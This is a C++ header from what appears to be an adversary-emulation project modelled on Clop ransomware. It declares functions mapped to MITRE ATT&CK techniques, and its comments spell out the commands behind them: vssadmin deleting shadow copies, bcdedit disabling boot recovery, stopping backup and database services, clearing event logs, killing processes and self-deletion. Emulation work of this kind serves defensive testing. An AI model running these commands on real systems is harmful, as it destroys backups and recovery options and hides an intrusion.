#pragma once
#include <chrono>
#include <format>
#include <string>
#include <thread>
#include <vector>
#include <Windows.h>
#include <winevt.h>
#include <wtsapi32.h>

#include "core.hpp"
#include "core_minimal.hpp"
#include "os_util.hpp"
#include "string_util.hpp"
#include "xor_obfuscation.hpp"

#ifdef _DEBUG
    #define LOOP_COUNT 2
#else
    #define LOOP_COUNT 678678
#endif

#define SELF_DESTRUCT_FAILED 0x64003


namespace Defense {

    /*
     * DummyLoop()
     *      About:
     *          Makes dummy API calls thousands of times in a loop.
     *          Win API calls:
     *              - EraseTape
     *              - DefineDosDeviceA
     *              - GetACP
     *              - FindAtomA
     *      MITRE ATT&CK Techniques:
     *          T1622: Debugger Evasion
     *          T1106: Native API
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void DummyLoop();

    /*
     * RemoveShadowCopies()
     *      About:
     *          Deletes and resizes shadow copies.
     *          Creates the following processes using CreateProcess to call cmd.exe /c:
     *              - vssadmin Delete Shadows /all /quiet
     *              - vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
     *              - vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
     *              - vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
     *              - vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
     *              - vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
     *              - vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
     *              - vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
     *              - vssadmin Delete Shadows /all /quiet
     *      Result:
     *          The above commands are run and their output is logged
     *      MITRE ATT&CK Techniques:
     *          T1490: Inhibit system recovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void RemoveShadowCopies();

    /*
     * ClearWindowsEventLogs:
     *      About:
     *          Attempts to clear each available Windows event log channel.
     *          Relevant API calls:
     *              EvtOpenChannelEnum, EvtNextChannelPath, EvtClearLog
     *      Result:
     *          Cleared Windows event log channels
     *      MITRE ATT&CK Techniques:
     *          T1070.001: Indicator Removal: Clear Windows Event Logs
     *          T1106: Native API
     *      CTI:
     *          https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/
     */
    void ClearWindowsEventLogs();
    
    /*
     * DisableBootRecovery()
     *      About:
     *          Disables boot recovery options and sets to prevent warning the user of any
     *          failure in the boot process.
     *          Creates the following processes using CreateProcess to call cmd.exe /c:
     *              - bcdedit /set {default} recoveryenabled No
     *              - bcdedit /set {default} bootstatuspolicy ignoreallfailures
     *      Result:
     *          The above commands are run and their output is logged
     *      MITRE ATT&CK Techniques:
     *          T1490: Inhibit system recovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void DisableBootRecovery();

    /*
     * StopServices()
     *      About:
     *          Searches for certain services on the target and uninstalls/disables them.
     *          Attempts to stop the following services using "net stop /y":
     *              - SQLAgent$SYSTEM_BGC
     *              - SQLAgent$ECWDB2
     *              - "Zoolz 2 Service"
     *              - EraserSvc11710
     *              - SQLAgent$PROFXENGAGEMENT
     *              - MSSQLFDLauncher$TPSAMA
     *              - SstpSvc
     *              - MSOLAP$SQL_2008
     *              - sacsvr
     *              - VeeamNFSSvc
     *              - VeeamTransportSvc
     *              - MSSQLSERVER
     *              - MSSQLServerADHelper100
     *              - wbengine
     *              - SQLWriter
     *              - MSSQLFDLauncher$TPS
     *              - ReportServer$TPSAMA
     *              - MSSQL$SYSTEM_BGC
     *              - VeeamBrokerSvc
     *              - MSSQLFDLauncher$PROFXENGAGEMENT
     *              - VeeamDeploymentService
     *              - SQLAgent$TPS
     *              - DCAgent
     *              - MSSQLFDLauncher$SBSMONITORING
     *              - MySQL80
     *              - MSOLAP$SYSTEM_BGC
     *              - ReportServer$TPS
     *              - MSSQL$ECWDB2
     *              - SQLSERVERAGENT
     *              - SMTPSvc
     *              - MSSQL$VEEAMSQL2008R2
     *              - MSExchangeSA
     *              - MSSQLServerADHelper
     *              - SQLTELEMETRY
     *              - POP3Svc
     *              - MSOLAP$TPSAMA
     *              - "Veeam Backup Catalog Data Service"
     *              - MSSQL$SBSMONITORING
     *              - ReportServer$SYSTEM_BGC
     *              - MySQL57
     *              - VeeamMountSvc
     *              - MsDtsServer110
     *              - SQLAgent$BKUPEXEC
     *              - UI0Detect
     *              - ReportServer
     *              - SQLTELEMETRY$ECWDB2
     *              - MSSQLFDLauncher$SYSTEM_BGC
     *              - MSSQL$BKUPEXEC
     *              - SQLAgent$PRACTTICEBGC
     *              - MSExchangeSRS
     *              - SQLAgent$VEEAMSQL2008R2
     *              - VeeamCatalogSvc
     *              - SQLAgent$SHAREPOINT
     *              - NetMsmqActivator
     *              - MsDtsServer
     *              - SQLAgent$SQL_2008
     *              - SDRSVC
     *              - IISAdmin
     *              - SQLAgent$PRACTTICEMGT
     *              - SQLAgent$VEEAMSQL2008R2
     *              - VeeamHvIntegrationSvc
     *              - W3Svc
     *              - "SQLsafe Backup Service"
     *              - SQLAgent$CXDB
     *              - SQLBrowser
     *              - MSSQLFDLauncher$SQL_2008
     *              - VeeamBackupSvc
     *              - SQLAgent$VEEAMSQL2012
     *              - MSExchangeMGMT
     *              - SamSs
     *              - MSExchangeES
     *              - MSSQL$TPSAMA
     *              - VeeamCloudSvc
     *              - MSSQL$PRACTICEMGT
     *              - SQLAgent$TPSAMA
     *              - SQLAgent$SBSMONITORING
     *              - MSSQL$VEEAMSQL2012
     *              - SQLSafeOLRService
     *              - VeeamEnterpriseManagerSvc
     *              - SQLAgent$SQLEXPRESS
     *              - OracleClientCache80
     *              - MSSQL$PROFXENGAGEMENT
     *              - IMAP4Svc
     *              - MSExchangeIS
     *              - MSSQLFDLauncher
     *              - MSExchangeMTA
     *              - "SQL Backups"
     *              - MSSQL$TPS
     *              - MsDtsServer100
     *              - MSSQL$SHAREPOINT
     *              - msftesql$PROD
     *              - mozyprobackup
     *              - MSSQL$SQL_2008
     *              - SNAC
     *              - ReportServer$SQL_2008
     *              - MSSQL$SQLEXPRESS
     *              - MSSQL$PRACTTICEBGC
     *              - VeeamRESTSvc
     *              - MMS
     *              - RESvc
     *              - MSSQL$VEEAMSQL2008R2
     *              - MSSQLFDLauncher$SHAREPOINT
     *              - "SQLsafe Filter Service"
     *              - MSSQL$PROD
     *              - SQLAgent$PROD
     *              - MSOLAP$TPS
     *              - VeeamDeploySvc
     *              - MSSQLServerOLAPService
     *      Result:
     *          The above services are stopped if present, except for SamSs
     *          because Windows does not allow it to be stopped.
     *      MITRE ATT&CK Techniques:
     *          T1489: Service Stop
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void StopServices();

    /*
     * CompareProcess(std::string processName)
     *      About:
     *          Takes a string, converts it to uppercase, hashes it, and compares the hash
     *          to a predefined list of hashes.
     *      Result:
     *          Returns true if the hash of the string is found in the list, otherwise
     *          false.
     *      Returns:
     *          [bool]
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CompareProcess(std::string processName);

    /*
     * KillProcess(LPSTR proc_name, DWORD proc_id)
     *      About:
     *          Terminates a process with the given process id.
     *      Result:
     *          A terminated process.
     *      MITRE ATT&CK Techniques:
     *          T1489: Service Stop
     *          T1106: Native API
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void KillProcess(LPSTR proc_name, DWORD proc_id);

    /*
     * KillProcesses:
     *      About:
     *          Enumerates processes on the local system using WTSEnumerateProcesses()
     *          and terminates any that are included in a predefined list of hashes:
     *              - MSFTESQL.EXE
     *              - SQLAGENT.EXE
     *              - SQLBROSWER.EXE
     *              - SQLWRITER.EXE
     *              - OCSSD.EXE
     *              - DBSNMP.EXE
     *              - SYNCTIME.EXE
     *              - AGNTSVC.EXEISQLPLUSSVC.EXE
     *              - XFSSVCCON.EXE
     *              - SQLSERVR.EXE
     *              - MYDESKTOPSERVICE.EXE
     *              - OCAUTOUPDS.EXE
     *              - AGNTSVC.EXEAGNTSVC.EXE
     *              - AGNTSVC.EXEENCSVC.EXE
     *              - FIREFOXCONFIG.EXE
     *              - TBIRDCONFIG.EXE
     *              - MYDESKTOPQOS.EXE
     *              - OCOMM.EXE
     *              - MYSQLD.EXE
     *              - MYSQLD-NT.EXE
     *              - MYSQLD-OPT.EXE
     *              - DBENG50.EXE
     *              - SQBCORESERVICE.EXE
     *              - SCALC.EXE
     *              - INFOPATH.EXE
     *              - SBASE.EXE
     *              - ONENOTE.EXE
     *              - OUTLOOK.EXE
     *              - SIMPRESS.EXE
     *              - STEAM.EXE
     *              - THEBAT.EXE
     *              - THEBAT64.EXE
     *              - THUNDERBIRD.EXE
     *              - SDRAW.EXE
     *              - SWRITER.EXE
     *              - WORDPAD.EXE
     *              - SOFFICE.BIN
     *      Result:
     *          Terminated processes
     *      MITRE ATT&CK Techniques:
     *          T1489: Service Stop
     *          T1057: Process Discovery
     *          T1106: Native API
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     *      Other References:
     *          https://stackoverflow.com/a/42126277/
     */
    void KillProcesses();

    /*
     * KillProcessesThread:
     *      About:
     *          Calls KillProcesses() in an infinite loop, waiting a minute between
     *          each call.
     *      Result:
     *          Thread loops infinitely, killing a set of processes every minute.
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void KillProcessesThread();

    /*
     * DisableErrors:
     *      About:
     *          Set error mode to SEM_FAILCRITICALERRORS to prevent displaying error message
     *          boxes if it crashes. Calls SetErrorMode().
     *      Result:
     *          Error windows are disabled.
     *      MITRE ATT&CK Techniques:
     *          T1562.006 Impair Defenses: Indicator Blocking
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void DisableErrors();

    /*
     * SelfDestruct:
     *      About:
     *          Spawns the process cmd.exe /c timeout 7 & del "{path to self}" to delete itself from
     *          disk after terminating itself via TerminateProcess.
     *          Deletes itself using the short path.
     *          Relevant API calls:
     *              CreateProcessW, TerminateProcess, GetModuleFileNameW, GetShortPathNameW
     *      Result:
     *          Terminated self and binary removed from disk.
     *      MITRE ATT&CK Techniques:
     *          T1070.004: Indicator Removal: File Deletion
     *          T1059.003: Command and Scripting Interpreter: Windows Command Shell
     *          T1106: Native API
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     *          https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/
     */
    void SelfDestruct(UINT exit_code);

}